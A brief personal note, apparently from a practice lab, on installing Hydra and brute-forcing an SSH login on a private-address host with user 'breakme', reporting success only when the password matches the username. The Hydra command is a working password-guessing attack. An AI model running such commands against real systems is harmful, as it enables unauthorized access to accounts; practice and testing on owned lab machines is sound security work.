#### installation

```
sudo dnf install hydra
```

***

#### bruteforce ssh

This worked:
```
hydra -l breakme -e nsr 192.168.2.172 ssh
```
Password was cracked in 3 tries, but it was the same as the username.

**but it doesnt work when the password is not the same as the username...**

***
